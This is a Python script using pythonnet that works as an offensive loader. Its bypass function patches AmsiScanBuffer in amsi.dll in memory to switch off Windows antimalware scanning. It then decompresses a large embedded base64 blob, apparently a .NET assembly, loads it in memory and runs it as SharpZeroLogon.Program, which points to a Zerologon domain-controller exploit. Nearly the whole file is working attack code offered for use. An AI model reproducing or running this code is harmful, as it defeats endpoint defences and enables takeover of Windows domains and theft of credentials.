import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpZeroLogon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()